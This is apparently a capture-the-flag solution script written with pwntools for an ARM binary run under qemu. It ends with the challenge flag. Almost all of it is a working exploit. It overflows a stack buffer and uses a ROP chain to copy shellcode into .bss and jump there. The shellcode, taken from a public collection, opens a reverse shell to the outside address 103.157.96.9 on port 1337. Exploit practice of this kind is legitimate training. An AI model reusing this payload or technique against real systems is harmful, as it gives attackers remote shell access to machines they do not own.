from pwn import *

bss_addr = 0x00073e80+0x1000
#p = remote('202.148.27.84', 20002)
p = process(['/usr/sbin/qemu-arm-static','./main'])
host = b''.join([p8(int(x)) for x in '103.157.96.9'.split('.')])
port = p16(1337)[::-1]

# http://shell-storm.org/shellcode/files/shellcode-821.php
shellcode = b"\x01\x10\x8F\xE2\x11\xFF\x2F\xE1\x02\x20\x01\x21\x92\x1a\x0f\x02\x19\x37\x01\xdf\x06\x1c\x08\xa1\x10\x22\x02\x37\x01\xdf\x3f\x27\x02\x21\x30\x1c\x01\xdf\x01\x39\xfb\xd5\x05\xa0\x92\x1a\x05\xb4\x69\x46\x0b\x27\x01\xdf\xc0\x46\x02\x00%s%s\x2f\x62\x69\x6e\x2f\x73\x68\x00" % (port,host)
payload = b''.join([
    b'A'*(0x20+4),

    # write shellcode to bss
    p32(0x000103f9), # pop {r4, pc};
    p32(bss_addr+(4*0)),
    p32(0x00014c29), # pop {r3, pc};
    shellcode[(4*0):(4*1)],
    
    # another write to shellcode but SIMPLIFIED
    b''.join([
        p32(0x0001a37d) + # str r3, [r4]; pop {r4, pc};
        p32(bss_addr+(4*i)) +
        p32(0x00014c29) + # pop {r3, pc};
        shellcode[(4*i):(4*(i+1))].ljust(4, b'\x00') for i in range(1, len(shellcode))
    ]),
    
    # mov last 4 byte shellcode then redirect execution
    p32(0x0001a37d), # str r3, [r4]; pop {r4, pc};
    b'X'*4,
    p32(bss_addr)
])

p.sendline(payload)
p.interactive()
# redmask{br0ther_in_arm_pwn}
